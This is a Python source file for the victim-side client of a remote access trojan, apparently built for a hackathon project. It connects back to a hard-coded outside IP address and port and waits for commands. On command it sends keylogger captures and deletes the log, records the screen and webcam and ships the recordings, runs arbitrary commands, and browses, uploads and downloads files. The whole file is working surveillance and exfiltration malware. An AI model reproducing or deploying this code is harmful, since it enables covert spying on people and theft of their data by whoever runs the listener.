import socket
import os
import subprocess
import time

class Victim():
    def __init__(self):
        self.host = "18.216.151.152"
        self.port = 5588
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect_to_attacker(self):
        while True:
            try:
                self.sock.connect((self.host, self.port))
                break
            except:
                self.sock.close()
                time.sleep(5)
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def disconnect_from_attacker(self):
        try:
            self.sock.close()
        except:
            pass

    def get_keylogger(self):
        current_directory = os.getcwd()
        os.chdir("/Users/gary.szekely/Desktop/Personal Repositories/HackUMassIX/KeyLogger")
        file = open("keylogger.txt", "rb")
        data = file.read()
        file.close()
        os.remove("keylogger.txt")
        self.sock.send(data)
        os.chdir(current_directory)

    def get_screen_recording(self):
        current_directory = os.getcwd()
        os.chdir("/Users/gary.szekely/Desktop/Personal Repositories/HackUMassIX/ImgLogger")
        total_seconds = self.sock.recv(1024).decode()
        process = subprocess.Popen(["python3", "imglogger.py", total_seconds], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        process.wait()
        file = open("screenrecord.mp4", "rb")
        data = file.read()
        file.close()
        self.sock.send(data)
        os.chdir(current_directory)

    def get_camera_recording(self):
        current_directory = os.getcwd()
        os.chdir("/Users/gary.szekely/Desktop/Personal Repositories/HackUMassIX/ImgLogger")
        total_seconds = self.sock.recv(1024).decode()
        process = subprocess.Popen(["python3", "camlogger.py", total_seconds], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        process.wait()
        file = open("CamRecording.mp4", "rb")
        data = file.read()
        file.close()
        self.sock.send(data)
        os.chdir(current_directory)

    def chaos(self):
        current_directory = os.getcwd()
        os.chdir("/Users/gary.szekely/Desktop/Personal Repositories/HackUMassIX/Chaos")
        command = self.sock.recv(1024).decode()
        if command != "Quit":
            args = command.split(" ")
            subprocess.Popen(["python3", "chaos.py"] + args)
        os.chdir(current_directory)
    
    def file_system(self):
        while True:
            try:
                command = self.sock.recv(1024).decode()
                if command == "ls" or command == "pwd":
                    if command == "ls":
                        process = subprocess.Popen(["ls", "-a"], stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
                    else:
                        process = subprocess.Popen(["pwd"], stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
                    stdout = process.communicate()[0]
                    self.sock.send(stdout)
                elif command == "cd":
                    directories = next(os.walk("."))[1]
                    directories_str = " ".join(directories)
                    if directories_str == "":
                        directories_str = "No Directories"
                    self.sock.send(directories_str.encode())
                    directory = self.sock.recv(1024).decode()
                    os.chdir(directory)
                elif command == "mkdir":
                    directory = self.sock.recv(1024).decode()
                    os.mkdir(directory)
                elif command == "get":
                    files = [f for f in os.listdir('.') if os.path.isfile(f)]
                    files_str = " ".join(files)
                    if files_str == "":
                        files_str = "No Files"
                    self.sock.send(files_str.encode())
                    file_path = self.sock.recv(1024).decode()
                    file = open(file_path, "rb")
                    data = file.read()
                    self.sock.send(data)
                elif command == "put":
                    file_name = self.sock.recv(1024).decode()
                    self.sock.send("Ready".encode())
                    file_buffer = b""
                    file_data = self.sock.recv(1024)
                    self.sock.settimeout(3)
                    while file_data:
                        file_buffer = b"".join([file_buffer, file_data])
                        try:
                            file_data = self.sock.recv(1024)
                        except socket.timeout:
                            break
                    self.sock.settimeout(None)
                    file = open(file_name, "wb")
                    file.write(file_buffer)
                    file.close()
                else:
                    break
            except:
                pass

if __name__ == "__main__":
    while True:
        victim = Victim()
        victim.connect_to_attacker()
        while True:
            command = victim.sock.recv(1024).decode()
            if command == "Get keylogger":
                victim.get_keylogger()
            elif command == "Get screen recording":
                victim.get_screen_recording()
            elif command == "Get camera recording":
                victim.get_camera_recording()
            elif command == "File system":
                victim.file_system()
            elif command == "Disconnect":
                break
            else:
                victim.chaos()
        victim.disconnect_from_attacker()
